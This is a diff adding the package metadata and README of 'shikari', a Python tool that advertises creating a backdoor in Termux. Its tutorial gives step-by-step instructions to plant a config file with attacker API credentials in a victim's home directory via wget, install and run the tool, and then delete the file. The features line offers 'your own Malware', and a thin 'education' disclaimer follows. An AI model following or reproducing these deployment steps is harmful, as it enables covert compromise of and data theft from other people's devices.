@@ -1,0 +1,74 @@
+Metadata-Version: 2.1
+Name: shikari
+Version: 1.0
+Summary: Create Powerful Backdoor in Termux
+Home-page: https://github.com/Bhai4You/
+Author: Parixit Sutariya
+Author-email: parixit1337@gmail.com
+License: UNKNOWN
+Platform: UNKNOWN
+Classifier: Programming Language :: Python
+Classifier: License :: OSI Approved :: MIT License
+Description-Content-Type: text/markdown
+License-File: LICENSE.txt
+
+<!--
+https://pypi.org/project/shikari/
+-->
+
+[![](https://img.shields.io/pypi/pyversions/readme-generator.svg?longCache=True)](https://pypi.org/project/readme-generator/)
+
+#### Installation
+```
+$ pip install shikari
+```
+
+### Tutorial
++ 1) copy below code then modify it with your details. 
++ 2) save it "shikari.txt"
++ 3) upload it on your github repo
++ 4) download shikari.txt file on victim's "$HOME" by wget command
++ 5) pip install shikari && shikari
++ 6) remove shikari.txt
++ 7) Done ;)
+
+```
+export api="keyamJ*********"
+export base='appJ8Pj*****'
+export table="hack"
+export folder="ADM"
+[[ "${#BASH_SOURCE[@]}" -gt "1" ]] && { return 0; }
+```
++ change api,base,table with your details.
+
+#### Features
++   **`shikari`**, ** Create your own Malware ;) **
+
+
+#### How it works
+```
+$ pip install shikari
+```
+
+### Disclaimer
+```
+We are not responsible for your loss because of shikari !
+this tool is made for Education/Learning Purpose.
+Dont harm anyone by Shikari.
+```
+#### Usage
+```
+$ shikari
+
+
+Created by Parixit Sutariya
+Github : github.com/Bhai4You
+Blogspot : https://bhai4you.blogspot.com
+
+```
+
+<p align="center">
+    <a href="https://github.com/Bhai4you/shikari">Github</a>
+</p>
+
+
